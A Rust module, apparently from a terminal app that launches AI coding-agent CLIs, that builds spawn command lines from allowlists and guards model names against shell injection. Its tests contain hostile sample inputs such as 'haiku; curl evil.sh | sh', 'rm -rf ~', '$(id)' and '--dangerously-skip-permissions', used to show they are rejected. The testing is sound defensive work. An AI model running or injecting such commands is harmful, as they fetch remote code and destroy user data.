//! The agent half of the pty command line, ported from
//! `src/main/lib/agent-spawn.js` (pinned by `test/agent-spawn.test.js`,
//! ported below as `#[cfg(test)] mod tests`). `createPty`/the future
//! `ipc::pty::pty_create` builds the spawned command line in main/Rust
//! precisely so a compromised renderer can't request arbitrary binaries or
//! arguments — the invariant, stated once: every byte of a built command
//! line is either a literal spelled out below or an element of one of the
//! allowlist arrays (`AGENTS`, `AGENT_MODELS`). An incoming value is only
//! ever COMPARED against those arrays and then thrown away — the string
//! that reaches the command line is always the allowlist's own copy, never
//! the caller-supplied one that merely compared equal.
//!
//! `build_headless_spawn` at the bottom is the background-flow-run
//! counterpart: same allowlist, same vetting, different shape — an argv
//! array rather than a shell command line (see that function's doc comment
//! for why a brief may ride along there and a model still may not ride
//! along unvetted).
//!
//! ---- Two type-level simplifications vs. the JS original ----
//!
//! `model`/`brief` are typed `Option<&str>` rather than ported as
//! JS-style dynamic values. The JS suite drills a `typeof model !==
//! 'string'` guard (`{ toString: 'haiku' }` crosses IPC intact and has no
//! callable `toString`, so interpolating it into a template literal used
//! to throw) and an analogous `typeof brief !== 'string'` guard. Both
//! guards defend against a JS value that isn't a string at all — a
//! category `&str`/`Option<&str>` make unrepresentable at the type level,
//! the same simplification `store_keys.rs`'s `is_reserved_key(key: &str)`
//! documents for the JS original's `typeof key === 'string'` guard. A
//! Tauri command parameter typed `Option<String>` gets the equivalent
//! defense for free, one layer up, via serde rejecting a non-string JSON
//! value outright — strictly stronger, so those specific test cases are
//! not ported.
//!
//! `list: &[AgentEntry]` (vs. JS's `Array.isArray(list) ? list : []`
//! defensiveness) is the other: a Rust slice can't be null/non-array, so
//! `buildAgentSpawnFrom(null, ...)`/`buildAgentSpawnFrom(undefined, ...)`
//! have no port — an empty slice already covers "nothing to match
//! against".

// Every item below is exercised by its own #[cfg(test)] suite, but in a
// plain (non-test) build nothing calls any of it yet: the real caller
// (`ipc::pty::pty_create`) is a different slice's file (this phase's
// binding decision reserves `state.rs`/`Cargo.toml` — and so the PTY
// infra that would wire this in — to slice P1) and is still a stub as of
// this slice landing. One module-level allow here, same rationale as
// `confine.rs`'s (see that module's top doc comment), rather than
// scattering `#[allow(dead_code)]` over every item.
#![allow(dead_code)]

/// Mirrors `src/shared/pane-kinds.js`'s `AGENTS` constant — the built-in
/// agent CLIs spawnable as panes. `src/shared/**` stays JS-only per the
/// rewrite plan (still vitest-tested, imported by the unchanged renderer),
/// so there is no Rust module to import this from; this is the one
/// Rust-side copy. `ipc::agents` re-exports this exact item (`pub use
/// crate::agent_spawn::AGENTS;`) rather than keeping its own duplicate, so
/// `menu.rs`'s `use crate::ipc::agents::AGENTS` — the "New Pane" submenu —
/// keeps compiling unchanged.
pub const AGENTS: &[&str] = &["claude", "opencode", "pi"];

/// Mirrors `src/shared/agent-models.js`'s `AGENT_MODELS`: the fixed,
/// per-agent alias catalogs a flow node (or a pane) may pin a model from.
/// `opencode`/`pi` resolve models from a dynamic provider catalog, so they
/// ship a deliberately empty list — see that file's header for why an
/// empty list is the intended v1 behavior, not a placeholder. A plain
/// `&[(&str, &[&str])]` rather than a `HashMap`/`phf` map: this crate has
/// no `phf`/`once_cell` dependency yet (`Cargo.toml` is out of scope for
/// this slice) and the table is tiny, so a linear scan in `models_for`
/// costs nothing that matters.
pub const AGENT_MODELS: &[(&str, &[&str])] = &[
    ("claude", &["sonnet", "opus", "haiku", "fable"]),
    ("opencode", &[]),
    ("pi", &[]),
];

fn models_for(cmd: &str) -> &'static [&'static str] {
    AGENT_MODELS
        .iter()
        .find(|(k, _)| *k == cmd)
        .map(|(_, v)| *v)
        .unwrap_or(&[])
}

/// Every CLI in `AGENT_MODELS` spells the flag this way. A literal rather
/// than a per-kind field because an agent whose flag differs can't be
/// pinned at all until someone teaches this module about it — and until
/// then its models list is empty, so no flag is ever emitted for it.
const MODEL_FLAG: &str = "--model";

/// Port of `SAFE_MODEL = /^[a-z0-9-]+$/`: belt to the allowlist's braces.
/// Every vetted value already looks like this; the point is that if a bad
/// edit ever put a space, a quote, or a `;` into a models list, the build
/// functions below refuse to build a command line out of it rather than
/// handing the login shell a second command to run.
fn is_safe_model(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
}

/// The `provider/model` guard for CLIs that resolve models from a dynamic
/// provider catalog (opencode, pi) — there is no fixed allowlist to vet
/// against, so the format itself is the boundary. One or more `/`-joined
/// segments; the first is `[a-z0-9-]+`, the rest may also contain `.` and
/// `_` (`deepseek/deepseek-chat`, `eurouter/glm-5.2`,
/// `lmstudio/openai/gpt-oss-20b`). Same belt-and-braces role as
/// [`is_safe_model`]: a shell metacharacter can never ride a model string
/// onto the spawn line. Lowercase-only on purpose — every catalog value
/// observed in the wild is lowercase, and being stricter here costs only a
/// refused pin, never a failed spawn.
fn is_safe_dynamic_model(s: &str) -> bool {
    let mut segments = s.split('/');
    let Some(first) = segments.next() else {
        return false;
    };
    if !is_safe_model(first) {
        return false;
    }
    let mut seen_rest = false;
    for seg in segments {
        if seg.is_empty()
            || matches!(seg, "." | "..")
            || !seg.chars().all(|c| {
                c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '-' | '.' | '_')
            })
        {
            return false;
        }
        seen_rest = true;
    }
    seen_rest
}

/// Core of `vetModel`, parameterized over an explicit models list instead
/// of reaching into `AGENT_MODELS` itself. Split out so the "the character
/// guard is a backstop even if the allowlist itself is poisoned" test
/// (`test/agent-spawn.test.js`'s "the character guard behind the
/// allowlist") can be ported without mutating a shared allowlist at
/// runtime the way the JS test does (`AGENT_MODELS.claude.models.push(...)`
/// — `AGENT_MODELS` here is a `const`, so there is nothing to push onto).
///
/// `Ok(vetted)` is the ALLOWLIST'S copy of the alias; `Err(reason)` is the
/// human-readable warning the JS original hands `console.warn` — kept as
/// the `Err` payload rather than printed here so callers can assert on it
/// directly without capturing stderr (this crate has no logging
/// dependency to route it through yet), while the public builders below
/// still `eprintln!` it at the point they fall back to the CLI default,
/// preserving the operator-visible "this is your only trace of the
/// substitution" behavior the JS comment calls load-bearing.
fn vet_model_against(
    models: &[&str],
    cmd: &str,
    model: &str,
    from: &str,
) -> Result<String, String> {
    match models.iter().find(|&&m| m == model) {
        None => Err(format!(
            r#"{from}: ignoring model "{model}" for {cmd} — not an allowlisted alias; spawning on the CLI default"#
        )),
        Some(&vetted) => {
            if is_safe_model(vetted) {
                Ok(vetted.to_string())
            } else {
                // Only reachable when the allowlist itself grew an entry
                // that isn't a bare alias, that is a mistake in this crate
                // rather than in anyone's flow file.
                Err(format!(
                    r#"{from}: allowlisted model "{vetted}" for {cmd} is not a bare [a-z0-9-] alias — refusing to build a command line from it"#
                ))
            }
        }
    }
}

fn vet_model(cmd: &str, model: &str, from: &str) -> Result<String, String> {
    let aliases = models_for(cmd);
    if !aliases.is_empty() {
        // Fixed per-kind alias catalogs (claude): allowlist vetting.
        return vet_model_against(aliases, cmd, model, from);
    }
    // Empty allowlist (opencode/pi): the model comes from a dynamic
    // provider catalog, so the FORMAT is the boundary. A kind outside
    // AGENTS never reaches this arm (every caller vets only after the
    // AGENTS membership check), so the empty-allowlist arm here is
    // exactly the dynamic-catalog kinds.
    if is_safe_dynamic_model(model) {
        Ok(model.to_string())
    } else {
        Err(format!(
            r#"{from}: ignoring model "{model}" for {cmd} — not a safe provider/model id ([a-z0-9-]+/[a-z0-9._-]+); spawning on the CLI default"#
        ))
    }
}

/// One entry in the spawnable-kind list `build_agent_spawn_from` matches
/// `kind` against — the normalized shape `mergeAgents` (`custom_agents.rs`)
/// produces for both built-ins and vetted customs, so this builder never
/// branches on which kind of entry it has. `label` rides along for
/// customs (UI display — the agents-list command, not spawning) and is
/// `None` for built-ins, matching the JS shape's `{ id, bin, custom }`
/// (no `label` key at all) vs. `{ id, label, bin, args?, modelFlag?,
/// custom: true }`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AgentEntry {
    pub id: String,
    pub bin: String,
    pub custom: bool,
    pub label: Option<String>,
    pub args: Vec<String>,
    pub model_flag: Option<String>,
}

impl AgentEntry {
    /// The built-in normalization both `build_agent_spawn`'s wrapper and
    /// `custom_agents::merge_agents` use: `{ id: name, bin: name, custom:
    /// false }` in the JS shape.
    pub fn builtin(name: &str) -> Self {
        Self {
            id: name.to_string(),
            bin: name.to_string(),
            custom: false,
            label: None,
            args: Vec::new(),
            model_flag: None,
        }
    }
}

/// Returns the command string for `-c`, or `None` when `kind` matches
/// nothing in `list` (a plain `terminal` pane, or anything unrecognized)
/// — `None` rather than `""` so the caller branches on "is there a
/// command" instead of on the emptiness of one.
///
/// The generalized form: `list` is `mergeAgents`' normalized entries
/// (`custom_agents::merge_agents`), so a caller can resolve `kind` against
/// built-ins PLUS vetted custom CLIs per spawn without this module ever
/// reading the store. The invariant at the top of this file is unchanged:
/// an incoming `kind`/`model` is only ever COMPARED against `list`/the
/// allowlist and then thrown away — the string that reaches the command
/// line is `list`'s own copies (the entry's `bin`, its already-vetted
/// `args`, the allowlist's model alias), never a byte the caller handed
/// in.
pub fn build_agent_spawn_from(
    list: &[AgentEntry],
    kind: &str,
    model: Option<&str>,
) -> Option<String> {
    let entry = list.iter().find(|e| e.id == kind)?;
    // The entry's own bin, never the caller's kind string — for built-ins
    // they spell the same word, and for customs the bin is what
    // `vet_custom_agent` already proved is a bare command name. Args ride
    // along verbatim: they were vetted as inert single tokens at the
    // custom-agents door, which is the only reason joining them here is
    // safe.
    let mut base = entry.bin.clone();
    for a in &entry.args {
        base.push(' ');
        base.push_str(a);
    }
    // Absent is the overwhelmingly common case and the schema's only way
    // of saying "whatever the CLI defaults to", so it short-circuits
    // before any vetting below. An empty string means the same thing (a
    // hand-edited flow.json can spell the default either way).
    let model = match model {
        None => return Some(base),
        Some("") => return Some(base),
        Some(m) => m,
    };
    // Model pinning needs BOTH halves: the kind must declare which flag
    // its CLI takes (customs only get one by declaring `model_flag`, and
    // `AGENT_MODELS` only lists aliases for kinds that speak `--model`)
    // AND the model must be on the shared allowlist for the kind. Customs
    // start with empty model lists — the same posture as opencode/pi — so
    // a pin on a custom lands in `vet_model` as an ordinary miss and is
    // dropped to the CLI's default.
    let flag: Option<&str> = if entry.custom {
        entry.model_flag.as_deref()
    } else {
        Some(MODEL_FLAG)
    };
    let Some(flag) = flag else {
        eprintln!(
            r#"pty: ignoring model "{model}" for {} — no model flag declared; spawning on the CLI default"#,
            entry.bin
        );
        return Some(base);
    };
    match vet_model(&entry.id, model, "pty") {
        Ok(vetted) => Some(format!("{base} {flag} {vetted}")),
        Err(warning) => {
            eprintln!("{warning}");
            Some(base)
        }
    }
}

/// The built-in wrapper: every pre-customs caller keeps spelling it this
/// way. Built from `AGENTS`, normalized to the same shape `merge_agents`
/// emits for built-ins, so both spellings of the list agree exactly (see
/// `tests::the_wrapper_and_the_generalized_form_agree` below).
pub fn build_agent_spawn(kind: &str, model: Option<&str>) -> Option<String> {
    let builtins: Vec<AgentEntry> = AGENTS
        .iter()
        .map(|&name| AgentEntry::builtin(name))
        .collect();
    build_agent_spawn_from(&builtins, kind, model)
}

// ---- headless (background flow runs) ----

/// `{ cmd, args }` for a headless spawn — the argv `build_headless_spawn`
/// returns. Kept as a struct rather than a tuple so call sites read like
/// the JS object shape (`{ cmd, args }`) they mirror.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HeadlessSpawn {
    pub cmd: String,
    pub args: Vec<String>,
}

/// Per-kind template for running an agent NON-interactively: one prompt
/// in, one answer out, process exits. A kind with no entry here is not
/// backgroundable, `build_headless_spawn` returns `None` for it. Teaching
/// this module about another CLI is one match arm here plus that CLI's
/// own headless flag.
///
/// WHY THE BRIEF MAY BE IN HERE AT ALL. `build_agent_spawn`'s output is
/// handed to `zsh -l -c` — a shell parses it, which is what makes
/// `is_safe_model` load-bearing there. What this function returns is an
/// ARGV ARRAY for a direct `execvp`-style spawn: `cmd` and `args` reach
/// the child process untouched, with no shell anywhere in the chain, so
/// the brief is a single element the kernel hands the process as
/// `argv[2]`. No byte of it can become a second command, a redirect, a
/// flag, or anything else — it is data, start to finish. That is why
/// there is no character guard on the brief: not an oversight, and not
/// something to "fix" later by quoting it. The corollary: the moment a
/// template joins these into a string for a shell, the brief needs the
/// same treatment a model gets, and it cannot have it — a composed brief
/// is arbitrary prose by construction.
fn headless_template(cmd: &str, brief: &str, model: Option<String>) -> Option<HeadlessSpawn> {
    match cmd {
        "claude" => {
            let mut args = vec!["-p".to_string(), brief.to_string()];
            if let Some(model) = model {
                args.push(MODEL_FLAG.to_string());
                args.push(model);
            }
            Some(HeadlessSpawn {
                cmd: cmd.to_string(),
                args,
            })
        }
        // `opencode run [message..]` — one message in, one answer out,
        // `-m provider/model` when pinned.
        "opencode" => {
            let mut args = vec!["run".to_string()];
            if let Some(model) = model {
                args.push("-m".to_string());
                args.push(model);
            }
            args.push(brief.to_string());
            Some(HeadlessSpawn {
                cmd: cmd.to_string(),
                args,
            })
        }
        // `pi -p` — non-interactive: process the prompt and exit.
        "pi" => {
            let mut args = vec!["-p".to_string()];
            if let Some(model) = model {
                args.push(MODEL_FLAG.to_string());
                args.push(model);
            }
            args.push(brief.to_string());
            Some(HeadlessSpawn {
                cmd: cmd.to_string(),
                args,
            })
        }
        _ => None,
    }
}

/// `{ cmd, args }` for a background flow-run spawn, or `None` when `kind`
/// has no headless template (see `headless_template`) or the brief isn't
/// usable. `model`/`brief` non-string JS inputs have no port — see this
/// module's top doc comment.
pub fn build_headless_spawn(
    kind: &str,
    model: Option<&str>,
    brief: Option<&str>,
) -> Option<HeadlessSpawn> {
    if !AGENTS.contains(&kind) {
        return None;
    }
    // A brief that isn't a non-empty string is a bug upstream, not a
    // prompt — `claude -p ''` is the worst possible way to find out: with
    // no prompt to answer it reads a stdin that is a pipe nobody ever
    // writes to, that is a background node that hangs forever with
    // nothing in its log to say why.
    let Some(brief) = brief.filter(|b| !b.is_empty()) else {
        eprintln!("flow-run: refusing to run {kind} headless with a missing or empty brief");
        return None;
    };
    // Same short-circuit as `build_agent_spawn_from`: absent (or "") means
    // the CLI's own default and never warns. Vetted identically otherwise
    // — the argv shape makes the character guard belt-and-braces here
    // rather than load-bearing, but a pin that would be dropped from a
    // pane must be dropped from a background node too, or the two spawn
    // paths would disagree about what a flow file means.
    let vetted_model = match model.filter(|m| !m.is_empty()) {
        None => None,
        Some(model) => match vet_model(kind, model, "flow-run") {
            Ok(vetted) => Some(vetted),
            Err(warning) => {
                eprintln!("{warning}");
                None
            }
        },
    };
    headless_template(kind, brief, vetted_model)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::custom_agents::vet_custom_agent;

    // ---- build_agent_spawn — no model pinned ----

    #[test]
    fn no_model_pinned_returns_the_bare_agent_command() {
        assert_eq!(
            build_agent_spawn("claude", None),
            Some("claude".to_string())
        );
    }

    #[test]
    fn treats_an_empty_string_as_absent_not_as_a_bad_value() {
        // The editor deletes the key rather than writing '', but a
        // hand-edited flow.json can spell the default either way — both
        // mean "the CLI's own".
        assert_eq!(
            build_agent_spawn("claude", Some("")),
            Some("claude".to_string())
        );
    }

    // ---- build_agent_spawn — allowlisted model ----

    #[test]
    fn allowlisted_model_delivers_it_as_the_cli_flag() {
        assert_eq!(
            build_agent_spawn("claude", Some("haiku")),
            Some("claude --model haiku".to_string())
        );
        assert_eq!(
            build_agent_spawn("claude", Some("opus")),
            Some("claude --model opus".to_string())
        );
    }

    #[test]
    fn builds_a_command_line_for_every_alias_the_shared_allowlist_offers() {
        // The same self-check egress.test.js runs over DEFAULT_ALLOW:
        // whatever someone adds to AGENT_MODELS later must still produce
        // a usable command line, or the editor would offer a model that
        // silently spawns the default.
        for &(kind, models) in AGENT_MODELS {
            assert!(
                AGENTS.contains(&kind),
                "a models list for an unspawnable kind {kind} is dead config"
            );
            for &model in models {
                assert_eq!(
                    build_agent_spawn(kind, Some(model)),
                    Some(format!("{kind} --model {model}"))
                );
            }
        }
    }

    // ---- build_agent_spawn — non-agent kinds ----

    #[test]
    fn plain_terminal_returns_none_with_or_without_a_model() {
        // None, not "": the caller spawns a bare login shell off this
        // being falsy, and a login shell takes no --model.
        assert_eq!(build_agent_spawn("terminal", None), None);
        assert_eq!(build_agent_spawn("terminal", Some("haiku")), None);
    }

    #[test]
    fn a_kind_that_is_not_spawnable_at_all_returns_none() {
        // A flow written against a newer build, or by hand: validateFlow
        // only warns on an unknown kind, so one can reach here.
        assert_eq!(build_agent_spawn("gpt", Some("gpt-5")), None);
        assert_eq!(build_agent_spawn("", None), None);
    }

    // ---- build_agent_spawn — off-allowlist models are dropped, not passed through ----

    #[test]
    fn off_allowlist_model_spawns_the_default() {
        assert_eq!(
            build_agent_spawn("claude", Some("gpt-5")),
            Some("claude".to_string())
        );
    }

    #[test]
    fn never_lets_a_hostile_value_onto_the_command_line() {
        for model in [
            "haiku; curl evil.sh | sh", // command chaining
            "haiku && rm -rf ~",
            "$(id)", // command substitution
            "`id`",
            "haiku --dangerously-skip-permissions", // argument injection
            "--dangerously-skip-permissions",
            "-e",              // a lone flag
            "../../../bin/sh", // path traversal to another binary
            "HAIKU",           // the guard is lower-case only; near-misses are still misses
            "haiku ",
        ] {
            assert_eq!(
                build_agent_spawn("claude", Some(model)),
                Some("claude".to_string())
            );
        }
    }

    // ---- build_agent_spawn — kinds with an empty allowlist ----

    #[test]
    fn kinds_with_an_empty_allowlist_vet_the_provider_model_format_instead() {
        // Their catalogs are dynamic (agent-models.js), so no fixed alias
        // list exists — the provider/model FORMAT is the boundary for
        // these kinds. A malformed value drops to the CLI default, same
        // drop-to-default the claude allowlist miss has.
        for kind in ["opencode", "pi"] {
            assert_eq!(build_agent_spawn(kind, None), Some(kind.to_string()));
            assert_eq!(
                build_agent_spawn(kind, Some("anthropic/claude-haiku")),
                Some(format!("{kind} --model anthropic/claude-haiku"))
            );
            assert_eq!(
                build_agent_spawn(kind, Some("claude-haiku")),
                Some(kind.to_string()) // no provider segment — dropped
            );
            assert_eq!(
                build_agent_spawn(kind, Some("x; curl evil.sh")),
                Some(kind.to_string()) // shell shape — dropped
            );
        }
    }

    // ---- build_agent_spawn — the wrapper and the generalized form agree ----

    #[test]
    fn the_wrapper_and_the_generalized_form_agree() {
        let builtins: Vec<AgentEntry> = AGENTS
            .iter()
            .map(|&name| AgentEntry::builtin(name))
            .collect();
        for &kind in AGENTS {
            assert_eq!(
                build_agent_spawn_from(&builtins, kind, None),
                build_agent_spawn(kind, None)
            );
            if let Some(&model) = AGENT_MODELS
                .iter()
                .find(|(k, _)| *k == kind)
                .and_then(|(_, m)| m.first())
            {
                assert_eq!(
                    build_agent_spawn_from(&builtins, kind, Some(model)),
                    build_agent_spawn(kind, Some(model))
                );
            }
        }
        assert_eq!(build_agent_spawn_from(&builtins, "terminal", None), None);
        assert_eq!(build_agent_spawn_from(&builtins, "gpt", None), None);
    }

    // ---- the character guard behind the allowlist ----

    #[test]
    fn refuses_an_allowlisted_value_that_would_not_survive_a_shell() {
        // Defense in depth for the case the allowlist itself is the thing
        // that went wrong: the returned string is handed to `zsh -l -c`,
        // so a list entry carrying a `;` would be a second command, not a
        // model name. `vet_model_against` (rather than mutating the real
        // `AGENT_MODELS`, a `const`) simulates exactly that poisoning.
        let poisoned = "haiku; curl evil.sh | sh";
        let result = vet_model_against(&[poisoned], "claude", poisoned, "pty");
        assert_eq!(
            result,
            Err(format!(
                r#"pty: allowlisted model "{poisoned}" for claude is not a bare [a-z0-9-] alias — refusing to build a command line from it"#
            ))
        );
    }

    #[test]
    fn is_safe_model_rejects_shell_metacharacters_and_accepts_bare_aliases() {
        for model in ["sonnet", "opus", "haiku", "fable", "a-b-9"] {
            assert!(is_safe_model(model));
        }
        for model in ["haiku; curl evil.sh | sh", "HAIKU", "haiku ", "", "$(id)"] {
            assert!(!is_safe_model(model));
        }
    }

    // ---- headless (background flow runs) — the claude template ----

    const BRIEF: &str = "You are \"Researcher\" in a Tome flow \"release-notes\".";

    #[test]
    fn headless_puts_the_brief_in_one_argv_element_and_pins_nothing_by_default() {
        // The shape is the security property: cmd/args go straight to the
        // child process, so the brief is argv[2] and no byte of it is
        // ever parsed by anything.
        assert_eq!(
            build_headless_spawn("claude", None, Some(BRIEF)),
            Some(HeadlessSpawn {
                cmd: "claude".to_string(),
                args: vec!["-p".to_string(), BRIEF.to_string()],
            })
        );
    }

    #[test]
    fn headless_appends_the_flag_pair_for_an_allowlisted_pin() {
        assert_eq!(
            build_headless_spawn("claude", Some("haiku"), Some(BRIEF)),
            Some(HeadlessSpawn {
                cmd: "claude".to_string(),
                args: vec![
                    "-p".to_string(),
                    BRIEF.to_string(),
                    "--model".to_string(),
                    "haiku".to_string()
                ],
            })
        );
    }

    #[test]
    fn headless_keeps_a_nightmare_brief_intact_as_one_argv_element() {
        // Composed briefs embed hand-editable flow.json prose verbatim.
        // Every one of these is a fine prompt and a catastrophe in a
        // shell string — the whole point of the argv array is that they
        // stay one element, unaltered.
        let nasty =
            "read $(whoami); then `id`; \"quoted\" 'single' | tee /tmp/x & rm -rf ~\nline two";
        let result = build_headless_spawn("claude", None, Some(nasty)).unwrap();
        assert_eq!(result.args, vec!["-p".to_string(), nasty.to_string()]);
        assert_eq!(result.args[1], nasty); // byte for byte, not escaped or flattened
    }

    #[test]
    fn headless_vets_the_model_exactly_like_the_pane_path_does() {
        // Same allowlist, same drop-to-default on a miss — a pin that
        // would be ignored for a pane must be ignored for a background
        // node, or the two spawn paths disagree about what a flow file
        // means.
        for model in [
            "gpt-5",
            "--dangerously-skip-permissions",
            "HAIKU",
            "haiku ",
            "$(id)",
        ] {
            let result = build_headless_spawn("claude", Some(model), Some(BRIEF)).unwrap();
            assert_eq!(result.args, vec!["-p".to_string(), BRIEF.to_string()]); // no --model at all
                                                                                // …and the pane path drops the identical value.
            assert_eq!(
                build_agent_spawn("claude", Some(model)),
                Some("claude".to_string())
            );
        }
    }

    #[test]
    fn headless_treats_an_empty_model_as_absent_rather_than_as_a_bad_value() {
        let result = build_headless_spawn("claude", Some(""), Some(BRIEF)).unwrap();
        assert_eq!(result.args, vec!["-p".to_string(), BRIEF.to_string()]);
    }

    #[test]
    fn headless_refuses_an_allowlisted_alias_the_character_guard_rejects() {
        // Belt-and-braces on this path (there is no shell to confuse),
        // but it must behave identically to the pty path or the
        // allowlist means two things.
        let poisoned = "haiku; curl evil.sh | sh";
        let result = vet_model_against(&[poisoned], "claude", poisoned, "flow-run");
        assert!(result.is_err());
    }

    // ---- headless — refusals ----
    #[test]
    fn headless_returns_none_for_a_kind_with_no_headless_template() {
        // The three built-ins all background; anything outside them (and
        // a plain terminal) is refused by AGENTS membership before the
        // template is ever consulted. None is what makes the runner
        // refuse the WHOLE run naming the node, rather than half-running
        // a pipeline and stranding it.
        assert_eq!(build_headless_spawn("terminal", None, Some(BRIEF)), None);
        assert_eq!(build_headless_spawn("gpt", None, Some(BRIEF)), None);
    }

    // ---- headless — opencode / pi templates ----

    #[test]
    fn headless_opencode_runs_one_message_with_an_optional_provider_model_pin() {
        assert_eq!(
            build_headless_spawn("opencode", None, Some(BRIEF)),
            Some(HeadlessSpawn {
                cmd: "opencode".to_string(),
                args: vec!["run".to_string(), BRIEF.to_string()],
            })
        );
        assert_eq!(
            build_headless_spawn("opencode", Some("eurouter/glm-5.2"), Some(BRIEF)),
            Some(HeadlessSpawn {
                cmd: "opencode".to_string(),
                args: vec![
                    "run".to_string(),
                    "-m".to_string(),
                    "eurouter/glm-5.2".to_string(),
                    BRIEF.to_string()
                ],
            })
        );
    }

    #[test]
    fn headless_pi_uses_print_mode_and_takes_the_same_dynamic_model_shape() {
        assert_eq!(
            build_headless_spawn("pi", None, Some(BRIEF)),
            Some(HeadlessSpawn {
                cmd: "pi".to_string(),
                args: vec!["-p".to_string(), BRIEF.to_string()],
            })
        );
        assert_eq!(
            build_headless_spawn("pi", Some("deepseek/deepseek-chat"), Some(BRIEF)),
            Some(HeadlessSpawn {
                cmd: "pi".to_string(),
                args: vec![
                    "-p".to_string(),
                    "--model".to_string(),
                    "deepseek/deepseek-chat".to_string(),
                    BRIEF.to_string()
                ],
            })
        );
    }

    #[test]
    fn dynamic_model_vetting_accepts_provider_model_ids_and_refuses_shell_shapes() {
        for ok in [
            "deepseek/deepseek-chat",
            "eurouter/glm-5.2",
            "lmstudio/openai/gpt-oss-20b",
            "opencode/big-pickle",
        ] {
            assert_eq!(
                vet_model("opencode", ok, "test"),
                Ok(ok.to_string()),
                "{ok} should vet clean for opencode"
            );
        }
        for bad in [
            "gpt-5", // no provider segment
            "A/b",   // uppercase
            "a/b c", // space
            "a/b;c", // semicolon
            "a//b",  // empty segment
            "a/",    // trailing slash
            "$(id)/x", "x/../y",
        ] {
            assert!(
                vet_model("opencode", bad, "test").is_err(),
                "{bad} must be refused for opencode"
            );
            // the drop-to-default behavior the pane path also has:
            assert_eq!(
                build_headless_spawn("opencode", Some(bad), Some(BRIEF))
                    .unwrap()
                    .args,
                vec!["run".to_string(), BRIEF.to_string()]
            );
        }
    }

    #[test]
    fn claude_still_vets_against_its_fixed_alias_catalog_not_the_dynamic_format() {
        // claude has a non-empty allowlist, so the provider/model shape is
        // NOT accepted for it — only its own aliases are.
        assert!(vet_model("claude", "anthropic/claude-sonnet", "test").is_err());
        assert_eq!(
            vet_model("claude", "sonnet", "test"),
            Ok("sonnet".to_string())
        );
    }

    #[test]
    fn headless_returns_none_for_a_brief_that_is_not_a_non_empty_string() {
        // `claude -p ''` has no prompt to answer and reads a stdin nobody
        // ever writes to — a background node that hangs forever with
        // an empty log.
        assert_eq!(build_headless_spawn("claude", None, Some("")), None);
        assert_eq!(build_headless_spawn("claude", None, None), None);
    }

    // ---- interplay with custom_agents (kept here to avoid a cyclic test-only dependency) ----

    #[test]
    fn a_vetted_custom_agent_reaches_the_command_line_through_the_generalized_builder() {
        let raw = serde_json::json!({ "id": "aider", "label": "Aider", "bin": "aider" });
        let agent = vet_custom_agent(&raw).unwrap();
        assert_eq!(
            build_agent_spawn_from(&[agent], "aider", None),
            Some("aider".to_string())
        );
    }
}
